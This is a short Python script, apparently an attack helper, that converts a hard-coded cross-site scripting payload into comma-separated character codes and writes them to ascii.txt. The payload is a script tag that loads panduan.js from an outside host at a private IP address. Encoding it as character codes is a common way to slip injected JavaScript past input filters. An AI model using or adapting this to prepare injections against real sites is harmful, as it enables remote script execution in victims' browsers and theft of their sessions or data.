#__author__ = 'techxsh'
# -*- coding: utf-8 -*-
import re
outascii = ""
data = r"<script src=http://192.168.199.184/panduan.js></script>"
#print(data)
for conver in str(data):
    #print(ord(conver))
    outascii += str(ord(conver))+","
print(outascii)
a = open("ascii.txt", "w")
a.write(outascii)
a.close()